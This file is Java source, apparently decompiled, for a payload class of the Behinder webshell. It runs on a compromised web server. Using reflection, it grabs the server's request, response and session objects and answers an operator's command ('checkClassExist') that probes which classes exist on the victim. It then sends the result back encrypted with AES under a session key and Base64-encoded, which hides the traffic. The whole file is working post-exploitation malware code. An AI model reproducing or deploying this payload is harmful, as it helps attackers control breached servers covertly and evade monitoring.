package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Utils {
   public static String action;
   public static String className;
   public static String content;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label84: {
         try {
            var13 = true;
            this.fillContext(obj);
            if (action.equals("checkClassExist")) {
               result.put("status", "success");
               result.put("msg", this.checkClassExist(className) + "");
               var13 = false;
            } else {
               var13 = false;
            }
            break label84;
         } catch (Exception var17) {
            result.put("msg", var17.getMessage());
            result.put("status", "fail");
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   private boolean checkClassExist(String className) {
      try {
         Class.forName(className);
         return true;
      } catch (ClassNotFoundException var3) {
         return false;
      }
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private String base64encode(byte[] data) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
